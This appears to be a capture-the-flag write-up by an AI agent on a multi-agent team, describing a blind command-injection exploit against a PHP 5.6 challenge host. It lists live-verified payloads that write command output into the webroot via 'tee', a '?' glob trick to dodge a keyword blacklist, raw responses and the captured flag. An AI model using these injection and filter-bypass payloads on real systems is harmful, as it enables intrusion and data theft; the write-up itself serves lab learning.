# Lane A — tee-based blind exfil (agent-2, task t2)

Target: `http://node4.anna.nssctf.cn:27309/` — PHP 5.6, `exec($_GET['url'])`, output **not**
echoed (`exec($url)`), so the channel had to be *written down*, not read back.

Deliverable: `node4-27309/exploit.py` (+ `node4-27309/mock_node4.py`, offline replay harness).
Verified flag (board f1, captain + agent-1 recon lane): `NSSCTF{1ec6ae10-d171-4bee-88db-e6441c5bcd5a}`.

## 1. The primitive — why redirection is unnecessary

```
CMD|tee <name>          %7C = '|',  %20 = space
GET  http://node4.anna.nssctf.cn:27309/<name>
```

`exec()` runs `/bin/sh -c $url` with cwd = the PHP script's directory = the webroot, so
`tee` drops CMD's stdout *into the served document root*. `>` / `<` / `*` / `-` / `"` / `%` / `$`
are all blacklisted, `tee` needs none of them. Every payload was percent-encoded in the query
string (`?url=` is decoded by PHP **before** `preg_match`), and `exploit.py` re-checks every
payload against the exact server regex client-side before sending.

## 2. Payloads validated on the LIVE host (before teardown) — raw output

| # | payload (decoded) | request | raw response file |
|---|---|---|---|
| 1 | `id\|tee a1.txt` | `/?url=id%7Ctee%20a1.txt` | page tail `Can you see anything?`; `GET /a1.txt` → `uid=33(www-data) gid=33(www-data) groups=33(www-data)` |
| 2 | `dir /\|tee a2.txt` | `/?url=dir%20%2F%7Ctee%20a2.txt` | `GET /a2.txt` → `a_here_is_a_f1ag  dev  home  media  proc  sbin  tmp / bin  etc  lib  mnt  root  srv  usr / boot  flllllaaaaaaggggggg  lib64  opt  run  sys  var` |
| 3 | `nl /a_here_is_a_f1ag\|tee a4.txt` | `/?url=nl%20%2Fa_here_is_a_f1ag%7Ctee%20a4.txt` | `GET /a4.txt` → `     1	true_flag_1s_1n_flllllaaaaaaggggggg` |

All three returned HTTP 200 with body tail `Can you see anything?` (payload executed; a
blacklisted payload returns `Sorry,you can't use this.`). Steps 1–3 are LIVE-VERIFIED.

## 3. The `la` trap and the glob that dodges it

`la` is banned case-insensitively, so the literal path `/flllllaaaaaaggggggg` is rejected
(it contains `la`) and so is the word `flag`. The shell glob `?` is not blacklisted:

```
nl /fllll?aaaaaaggggggg          ->  /flllllaaaaaaggggggg      (5th 'l' swallowed by '?')
/?url=nl%20%2Ffllll%3Faaaaaaggggggg%7Ctee%20y.txt   then  GET /y.txt
```

Same trick as the winning chain run by agent-1 / confirmed by the captain.
`[a]` bracket globs are an equivalent fallback (`/fllll[a]aaaaaggggggg`).

## 4. Working chain, reproducible

```bash
python node4-27309/exploit.py roundtrip     # id|tee -> "CHANNEL OK"
python node4-27309/exploit.py chain         # dir / -> pointer file -> flag, fresh exfil names
python node4-27309/exploit.py tee "nl /fllll?aaaaaaggggggg" y.txt
python node4-27309/exploit.py fetch y.txt
python node4-27309/exploit.py selftest      # offline replay against mock_node4.py (host-independent)
```

`chain` generates hex-only exfil filenames (never contain a blacklisted substring), runs
`id` → `dir /` → `nl /a_here_is_a_f1ag` → `nl /fllll?aaaaaaggggggg`, and falls back to
`od` / `strings` / `grep NSSCTF` / `tail` on the same glob if `nl` yields nothing.

## 5. Dead ends (do not repeat)

- **`find /`** — `?url=find%20%2F%7Ctee%20a5.txt` returned `ok`, but the follow-up `GET /a5.txt`
  returned 0 bytes and the worker timed out; the instance died right after. Never re-run:
  it walks `/proc`, and on this box it coincides with the teardown. `dir /` (step 2) answers
  the same question in one round trip.
- **Literal `flag` / `la` anywhere** — `cat /flag`, `/flag`, `grep flag ...` are all rejected by
  the `la` substring rule, not just by the `cat` rule. Use `?` globs and readers like `nl`.
- **`ls`, `cat`, `more`, `less`, `echo`, `base64`, options with `-`, `>` redirection, `*`** —
  all banned; `dir` / `nl` / `tee` / `od` / `strings` / `grep` / `awk` replace them.
- **Page-body scraping** — the response body only ever contains the `highlight_file` source plus
  one of the two fixed strings; no command output is reflected. Blind only.

## 6. Offline replay proof (not the live target)

`python node4-27309/exploit.py selftest` starts `mock_node4.py`, which reproduces the exact
blacklist regex, both echo strings and the "exec into the webroot" behaviour, and serves a
**placeholder** flag. Last run: `PASS -- NSSCTF{selftest-placeholder-not-the-real-flag}`, all four
steps OK (`id|tee`, `dir /`, pointer file, `nl /fllll?aaaaaaggggggg`). This exercises the client
path end-to-end; it is *not* evidence about the real target.

## 7. UNVERIFIED by lane A

- **UNVERIFIED (host died):** I never read `/flllllaaaaaaggggggg` on the live host myself — I was
  between rounds 2 and 3 of the chain when the instance stopped accepting TCP (WinError 10061).
  The flag value `NSSCTF{1ec6ae10-d171-4bee-88db-e6441c5bcd5a}` is captain-verified from
  agent-1's chain, not from my own exfil file.
- **UNVERIFIED:** the `od` / `strings` / `grep NSSCTF` / `tail` fallbacks never executed against
  the live host (they are only exercised by the mock).
- **UNVERIFIED:** whether `find /` would have completed given enough time.
